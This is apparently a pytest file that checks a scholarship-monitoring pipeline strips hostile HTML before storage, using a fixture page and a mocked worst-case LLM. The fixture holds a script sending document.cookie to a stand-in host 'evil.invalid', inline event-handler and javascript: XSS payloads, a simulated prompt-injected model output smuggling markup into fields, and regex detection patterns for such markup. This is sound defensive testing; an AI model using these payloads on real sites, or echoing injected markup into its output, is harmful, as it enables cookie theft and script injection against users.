"""Monitoring-path sanitization (002 US8, T221, NFR-HARDEN-8, SC-010).

A fixture page carrying `<script>`, inline event handlers and `javascript:`
links is fetched THROUGH the monitoring path (real `run_source_monitor`, real
`extract_listing_from_page` and its HTML cleaner), and the LLM step is replaced
by a worst-case model that echoes hostile markup into the structured fields it
returns. Nothing hostile may reach stored scholarship text (columns or
provenance rows). API output is a pure projection of those stored fields, so a
clean store means clean output.

Real (rolled-back) DB, no network, no LLM.
"""

import json
import re
import uuid

import pytest

from app.data.repositories import scholarship_repo, source_repo
from app.models.monitoring import MonitoringTrigger
from app.models.scholarship import Scholarship, ScholarshipField
from app.schemas.source import SourceRegistryCreate
from app.services.classify import ClassifiedScholarshipFields
from app.tools.web_fetch import FetchResult
from app.workflows.source_monitor.graph import run_source_monitor

_FAKE_CLASSIFICATION = ClassifiedScholarshipFields(
    degree_level="PhD", degree_level_confidence="inferred",
    funding_status="fully_funded", funding_status_confidence="inferred",
    provider_type="gov", provider_type_confidence="inferred",
    country="Germany", country_confidence="inferred",
    field="Computer Science", field_confidence="inferred",
)

HOSTILE_PAGE = """<html><head><title>Listings</title>
<script>document.location='http://evil.invalid/?c='+document.cookie</script>
<style>body{background:url(javascript:alert(9))}</style></head>
<body onload="steal()">
<h1>Scholarship Listings For International Students</h1>
<div onclick="evil()" class="card">
  <a href="javascript:alert(1)" onmouseover="x()">Safe Harbour Scholarship</a>
  offers funding to international graduate students across many fields of study.
</div>
<img src="x" onerror="alert(2)">
<p>Applications open every autumn and close in the following spring semester.</p>
</body></html>"""

# What a prompt-injected model could return: markup smuggled into fields the
# deterministic grounding check does NOT cover (it only grounds `name`).
_HOSTILE_LLM = {
    "candidates": [
        {
            "name": "Safe Harbour Scholarship",
            "provider": '<img src=x onerror=alert(1)>Evil Provider <script>alert(1)</script>',
            "country": "Germany",
            "field": '<b onclick="x()">Computer Science</b>',
            "degree_level": "PhD",
            "funding_status": "fully_funded",
            "detail_url": "javascript:alert(3)",
            "deadline": "2027-03-01",
        }
    ]
}

_FORBIDDEN = [
    re.compile(r"<\s*/?\s*(script|style|img|b|a|iframe)\b", re.IGNORECASE),
    re.compile(r"\bon(click|load|error|mouseover)\s*=", re.IGNORECASE),
    re.compile(r"\b(javascript|vbscript)\s*:", re.IGNORECASE),
]


@pytest.fixture
def monitored(db_session_factory, monkeypatch):
    session = db_session_factory()
    uid = uuid.uuid4().hex[:8]
    source = source_repo.upsert_source_by_domain(
        session,
        SourceRegistryCreate(
            name=f"Sanitize Test {uid}", source_type="gov", official_status="official",
            domain=f"sanitize-{uid}.example.com", access_method="web", discovery_role=True,
            reliability_level="high", status="active",
        ),
    )
    real_monitorable = source_repo.get_monitorable_sources
    monkeypatch.setattr(
        source_repo, "get_monitorable_sources",
        lambda db, *a, **k: [s for s in real_monitorable(db, *a, **k) if s.id == source.id],
    )
    monkeypatch.setattr(
        "app.workflows.ingestion.graph.classify_service.classify_candidate", lambda text: _FAKE_CLASSIFICATION
    )
    seen_page_text: list[str] = []

    def hostile_llm(page_text, *, source_url):
        seen_page_text.append(page_text)
        return _HOSTILE_LLM

    monkeypatch.setattr("app.tools.extract_listing._llm_extract_listing", hostile_llm)

    def fetch(url):
        return FetchResult(url=url, success=True, status_code=200, html=HOSTILE_PAGE, final_url=url)

    run_source_monitor(
        session, trigger=MonitoringTrigger.MANUAL, fetch=fetch, sleep=lambda _d: None,
        validate_candidate=lambda db, cid: None,
    )
    yield session, source, seen_page_text
    session.close()


def _stored_strings(session, source) -> list[str]:
    values: list[str] = []
    for scholarship in scholarship_repo.list_for_source(session, source.id):
        for column in Scholarship.__table__.columns:
            value = getattr(scholarship, column.key)
            if isinstance(value, str):
                values.append(value)
        for row in session.query(ScholarshipField).filter(ScholarshipField.scholarship_id == scholarship.id):
            values.append(json.dumps(row.value, default=str))
    return values


def test_the_hostile_listing_is_actually_ingested(monitored):
    """Guards against a vacuous pass: the scholarship must really be stored."""
    session, source, _ = monitored
    stored = scholarship_repo.list_for_source(session, source.id)
    assert [s.name for s in stored] == ["Safe Harbour Scholarship"]


def test_markup_never_reaches_the_extractor_input(monitored):
    _, _, seen_page_text = monitored
    assert seen_page_text, "extractor was never called"
    for text in seen_page_text:
        assert "<" not in text and "onclick" not in text and "onerror" not in text
        assert "document.cookie" not in text  # the <script> body itself is gone


def test_no_hostile_markup_reaches_stored_scholarship_text(monitored):
    session, source, _ = monitored
    strings = _stored_strings(session, source)
    assert strings
    offenders = [(p.pattern, s) for s in strings for p in _FORBIDDEN if p.search(s)]
    assert offenders == []


def test_legitimate_content_survives_sanitization(monitored):
    session, source, _ = monitored
    [stored] = scholarship_repo.list_for_source(session, source.id)
    assert stored.name == "Safe Harbour Scholarship"
    assert stored.provider and "Evil Provider" in stored.provider  # text kept, markup removed
    assert stored.field and "Computer Science" in stored.field
